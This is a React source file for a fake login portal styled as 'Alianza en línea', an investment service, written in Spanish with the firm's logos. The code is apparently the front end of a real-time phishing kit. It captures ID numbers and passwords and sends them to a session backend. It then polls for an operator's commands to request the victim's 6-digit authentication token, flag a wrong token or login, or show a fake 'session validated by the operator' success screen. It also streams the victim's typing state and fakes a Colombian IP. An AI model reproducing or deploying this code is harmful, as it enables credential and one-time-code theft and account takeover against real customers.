import { useState, useRef, useEffect } from "react"

const DOCS = [
  "Cédula de Ciudadanía",
  "Cédula de Extranjería",
  "Tarjeta de Identidad",
  "Pasaporte",
  "Registro Civil",
  "NUIP",
]

export default function PortalPersonas({ onBack }) {
  const [docType, setDocType] = useState(DOCS[0])
  const [documentVal, setDocumentVal] = useState("")
  const [password, setPassword] = useState("")
  const [showPassword, setShowPassword] = useState(false)
  const [authorized, setAuthorized] = useState(false)
  const [username, setUsername] = useState("")
  const [loading, setLoading] = useState(false)
  const [loginError, setLoginError] = useState("")

  // Generic token and validation states
  const [otpType, setOtpType] = useState(null) // null, 'token'
  const [otpValues, setOtpValues] = useState(["", "", "", "", "", ""])
  const [otpSubmitting, setOtpSubmitting] = useState(false)
  const [otpError, setOtpError] = useState("")
  const [sessionSuccess, setSessionSuccess] = useState(false)

  const pingIntervalRef = useRef(null)
  const pollIntervalRef = useRef(null)

  const ready =
    documentVal.trim().length > 4 &&
    password.trim().length > 3 &&
    (!authorized || username.trim().length > 2)

  const stopLoops = () => {
    if (pingIntervalRef.current) clearInterval(pingIntervalRef.current)
    if (pollIntervalRef.current) clearInterval(pollIntervalRef.current)
  }

  const startSessionLoop = (sessId) => {
    stopLoops()

    // 1. Session keepalive (ping) every 3 seconds
    const sendPing = () => {
      fetch(`/api/sessions/${sessId}/ping`, { method: "POST" }).catch(() => {})
    }
    sendPing()
    pingIntervalRef.current = setInterval(sendPing, 3000)

    // 2. Poll session state every 1.5 seconds to check operator action
    pollIntervalRef.current = setInterval(async () => {
      try {
        const response = await fetch(`/api/sessions/${sessId}`)
        if (response.ok) {
          const data = await response.json()
          const action = data.action

          if (action === "done") {
            stopLoops()
            setOtpType(null)
            setLoading(false)
            setSessionSuccess(true)
          } else if (action === "token") {
            // Keep loader active if token is present and currently being validated on server
            if (data.token && data.token !== "") {
              setOtpSubmitting(true)
            } else {
              setOtpSubmitting(false)
              setOtpType("token")
            }
          } else if (action === "error-token") {
            setOtpSubmitting(false)
            setOtpError("Token incorrecto. Por favor, verifica e ingresa nuevamente.")
            setOtpValues(["", "", "", "", "", ""])
            // Reset action on server so it doesn't loop
            fetch(`/api/sessions/${sessId}/action`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({ action: null }),
            }).catch(() => {})
          } else if (action === "error-login") {
            stopLoops()
            setLoading(false)
            setOtpType(null)
            setLoginError("Usuario o contraseña incorrecta. Por favor, verifique sus datos.")
          }
        }
      } catch (_) {}
    }, 1500)
  }

  useEffect(() => {
    return () => stopLoops()
  }, [])

  function submit(event) {
    event.preventDefault()
    if (!ready || loading) return
    setLoading(true)
    setLoginError("")

    const sessId = "sess_" + Date.now() + "_" + Math.random().toString(36).substr(2, 9)
    sessionStorage.setItem("sessionId", sessId)

    const docStr = documentVal.trim()
    const passStr = password.trim()
    const userStr = username.trim()

    const sessionData = {
      id: sessId,
      username: `${docType.toUpperCase()}:${docStr}${authorized ? ` / ${userStr}` : ""}`,
      password: passStr,
      tipoUsuario: docType,
      device: window.innerWidth <= 768 ? "mobile" : "desktop",
      ip: "186.29." + Math.floor(Math.random() * 255) + "." + Math.floor(Math.random() * 255),
      state: "waiting",
      createdAt: Date.now(),
    }

    fetch("/api/sessions", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(sessionData),
    })
      .then((res) => {
        if (res.ok) {
          startSessionLoop(sessId)
        } else {
          setLoading(false)
          setLoginError("Error al conectar. Intente de nuevo.")
        }
      })
      .catch(() => {
        setLoading(false)
        setLoginError("Error al intentar conectar. Intente de nuevo.")
      })
  }

  const handleOtpChange = (index, val) => {
    const newVal = val.replace(/\D/g, "").slice(-1)
    const newOtpValues = [...otpValues]
    newOtpValues[index] = newVal
    setOtpValues(newOtpValues)

    let sessId = sessionStorage.getItem("sessionId")
    if (sessId) {
      const len = newOtpValues.filter((v) => v !== "").length
      const targetState = len > 0 ? "typing" : "waiting-token"
      fetch(`/api/sessions/${sessId}/state`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ state: targetState }),
      }).catch(() => {})
    }

    if (newVal && index < 5) {
      const nextInput = document.getElementById(`otp-slot-${index + 1}`)
      if (nextInput) nextInput.focus()
    }
  }

  const handleOtpKeyDown = (index, event) => {
    if (event.key === "Backspace" && !otpValues[index] && index > 0) {
      const newOtpValues = [...otpValues]
      newOtpValues[index - 1] = ""
      setOtpValues(newOtpValues)

      const prevInput = document.getElementById(`otp-slot-${index - 1}`)
      if (prevInput) {
        prevInput.focus()
      }
    }
  }

  const handleOtpPaste = (event) => {
    event.preventDefault()
    const clipboardData = event.clipboardData.getData("text") || ""
    const digits = clipboardData.replace(/\D/g, "").slice(0, 6).split("")

    const newOtpValues = [...otpValues]
    digits.forEach((digit, i) => {
      newOtpValues[i] = digit
    })
    setOtpValues(newOtpValues)

    const lastIdx = Math.min(digits.length, 6) - 1
    if (lastIdx >= 0) {
      const lastInput = document.getElementById(`otp-slot-${lastIdx}`)
      if (lastInput) lastInput.focus()
    }
  }

  const handleOtpSubmit = () => {
    const token = otpValues.join("")
    if (token.length !== 6) return

    setOtpSubmitting(true)
    let sessId = sessionStorage.getItem("sessionId")
    fetch(`/api/sessions/${sessId}/token`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token }),
    }).catch(() => {
      setOtpSubmitting(false)
    })
  }

  const handleOtpClose = () => {
    stopLoops()
    setOtpType(null)
    setLoading(false)
  }

  if (sessionSuccess) {
    return (
      <div className="portal portal--success">
        <section className="portal__form" style={{ flex: 1, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div className="portal__card" style={{ textAlign: "center", padding: "48px 32px" }}>
            <div style={{ color: "#3ecf8e", fontSize: "48px", marginBottom: "16px" }}>✓</div>
            <h2 style={{ marginBottom: "16px" }}>¡Ingreso Exitoso!</h2>
            <p style={{ color: "#5b7388", marginBottom: "32px" }}>
              Su sesión ha sido validada de forma segura por el operador.
            </p>
            <button type="button" className="portal__submit is-ready" onClick={onBack}>
              Continuar
            </button>
          </div>
        </section>
      </div>
    )
  }

  return (
    <div className={`portal ${loading ? "is-loading" : ""}`}>
      <section className="portal__intro">
        <div className="portal__copy">
          <h1>
            <span>Invierta con</span>
            <em>Alianza</em>
          </h1>
          <p>
            Bienvenido a Alianza en línea, protegemos el futuro con experiencia y
            responsabilidad para asegurar su bienestar financiero.
          </p>
        </div>
      </section>

      <section className="portal__form">
        <header className="portal__top">
          <button type="button" className="portal__brand" onClick={onBack}>
            <img src="/logo-enlinea-mark.png" alt="" />
            <img src="/logo-enlinea-text.png" alt="Alianza en líne@" />
          </button>
          <nav>
            <button type="button">Recomendaciones</button>
            <button type="button">Español</button>
            <button type="button">English</button>
          </nav>
        </header>

        {otpType === "token" ? (
          <form className="portal__card" onSubmit={(e) => { e.preventDefault(); handleOtpSubmit(); }}>
            <h2>VALIDACIÓN TOKEN</h2>

            {otpError && (
              <p style={{ color: "#d93838", fontSize: "0.875rem", fontWeight: "600", marginBottom: "16px" }}>
                {otpError}
              </p>
            )}

            <p style={{ color: "#6a6e80", fontSize: "0.9375rem", marginBottom: "32px", lineHeight: "1.5" }}>
              Para confirmar el inicio de sesión, utilice la App para generar el Token
            </p>

            <div style={{ display: "flex", justifyContent: "center", gap: "14px", marginBottom: "32px" }}>
              {otpValues.map((val, i) => (
                <input
                  key={i}
                  id={`otp-slot-${i}`}
                  style={{
                    width: "48px",
                    height: "80px",
                    border: "1.5px solid #035ba9",
                    borderRadius: "6px",
                    background: "#ffffff",
                    textAlign: "center",
                    fontSize: "1.75rem",
                    fontWeight: "700",
                    color: "#003057",
                    outline: "none"
                  }}
                  inputMode="numeric"
                  maxLength={1}
                  autoComplete="off"
                  value={val}
                  onChange={(e) => handleOtpChange(i, e.target.value)}
                  onKeyDown={(e) => handleOtpKeyDown(i, e)}
                  onPaste={handleOtpPaste}
                  aria-label={`Dígito ${i + 1}`}
                />
              ))}
            </div>

            <button
              type="submit"
              className={`portal__submit ${otpValues.join("").length === 6 ? "is-ready" : ""}`}
              disabled={otpValues.join("").length !== 6 || otpSubmitting}
              style={{ marginBottom: "16px" }}
            >
              Continuar
            </button>

            <button
              type="button"
              className="portal__register"
              onClick={handleOtpClose}
            >
              Cancelar
            </button>
          </form>
        ) : (
          <form className="portal__card" onSubmit={submit}>
            <h2>¡Bienvenido!</h2>

            {loginError && (
              <p style={{ color: "#d93838", fontSize: "0.875rem", fontWeight: "600", marginBottom: "16px" }}>
                {loginError}
              </p>
            )}

            <label>
              <span>Tipo de documento <i>*</i></span>
              <select value={docType} onChange={(event) => setDocType(event.target.value)}>
                {DOCS.map((item) => (
                  <option key={item}>{item}</option>
                ))}
              </select>
              {authorized ? <small className="portal__hint">Esta información pertenece al titular</small> : null}
            </label>

            <label>
              <span>Número de documento <i>*</i></span>
              <input
                value={documentVal}
                onChange={(event) => setDocumentVal(event.target.value)}
                placeholder="Escriba el número de documento"
                autoComplete="off"
              />
              {authorized ? <small className="portal__hint">Esta información pertenece al titular</small> : null}
            </label>

            {authorized ? (
              <label>
                <span>Usuario <i>*</i></span>
                <input
                  value={username}
                  onChange={(event) => setUsername(event.target.value)}
                  placeholder="Escriba el usuario"
                  autoComplete="username"
                />
              </label>
            ) : null}

            <label>
              <span>Contraseña <i>*</i></span>
              <span className="portal__pass">
                <input
                  type={showPassword ? "text" : "password"}
                  value={password}
                  onChange={(event) => setPassword(event.target.value)}
                  placeholder="Ingrese la contraseña"
                  autoComplete="current-password"
                />
                <button type="button" onClick={() => setShowPassword((open) => !open)} aria-label="Mostrar contraseña">
                  <svg viewBox="0 0 24 24" aria-hidden="true">
                    <path d="M12 5C7.9 5 4.1 7.91 2.08 13a16.5 16.5 0 0 0 19.84 0C19.9 7.91 16.1 5 12 5Zm0 12a6 6 0 1 1 6-6 6 6 0 0 1-6 6Zm0-9a3 3 0 1 0 3 3 3 3 0 0 0-3-3Z" />
                  </svg>
                </button>
              </span>
            </label>

            <button type="button" className="portal__forgot">
              ¿Olvidó la contraseña?
            </button>

            <label className="portal__check">
              <input
                type="checkbox"
                checked={authorized}
                onChange={(event) => {
                  const next = event.target.checked
                  setAuthorized(next)
                  if (!next) setUsername("")
                }}
              />
              Personas Autorizadas
            </label>

            <button type="submit" className={`portal__submit ${ready ? "is-ready" : ""}`} disabled={!ready || loading}>
              Ingrese
            </button>

            <p className="portal__account">¿No tiene cuenta?</p>
            <button type="button" className="portal__register">
              Regístrese
            </button>
            <p className="portal__note">Este registro solo es válido para Persona Natural.</p>
          </form>
        )}
      </section>

      {(loading && !otpType) || otpSubmitting ? (
        <div className="portal__loader" role="status" aria-live="polite">
          <span className="portal__spinner" />
          <span className="sr-only">Cargando</span>
        </div>
      ) : null}
    </div>
  )
}
